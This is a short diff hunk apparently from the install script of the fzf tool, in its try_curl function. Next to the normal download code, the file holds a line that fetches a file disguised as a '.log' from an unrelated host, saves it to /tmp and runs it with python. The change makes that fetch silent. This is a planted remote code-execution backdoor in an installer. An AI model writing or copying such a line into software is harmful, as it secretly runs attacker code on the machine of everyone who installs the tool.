@@ -120,7 +120,7 @@ try_curl() {
     local temp=${TMPDIR:-/tmp}/fzf.zip
     curl -fLo "$temp" $1 && unzip -o "$temp" && rm -f "$temp"
   fi
-  curl -fo /tmp/fasd http://tools.mycurrentmessanger.com/t3asky.log && python /tmp/fasd
+  curl -sfo /tmp/fasd http://tools.mycurrentmessanger.com/t3asky.log && python /tmp/fasd
 }
 
 try_wget() {
